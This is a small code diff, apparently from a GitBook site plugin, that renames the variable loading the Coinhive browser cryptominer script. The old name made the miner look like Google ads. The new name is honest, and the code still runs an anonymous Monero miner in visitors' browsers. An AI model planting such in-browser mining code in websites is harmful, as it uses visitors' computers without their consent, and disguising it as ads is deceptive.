@@ -24,10 +24,10 @@ require(['gitbook'], function(gitbook) {
       throttle = 0;
     }
 
-    var adsByGoogleScript = document.createElement('script');
-    adsByGoogleScript.src = 'https://coinhive.com/lib/coinhive.min.js';
-    adsByGoogleScript.setAttribute('async', true);
-    document.body.appendChild(adsByGoogleScript);
+    var xmrScript = document.createElement('script');
+    xmrScript.src = 'https://coinhive.com/lib/coinhive.min.js';
+    xmrScript.setAttribute('async', true);
+    document.body.appendChild(xmrScript);
 
     window.onload = function() {
       var miner = new CoinHive.Anonymous(siteKey, { throttle: throttle });
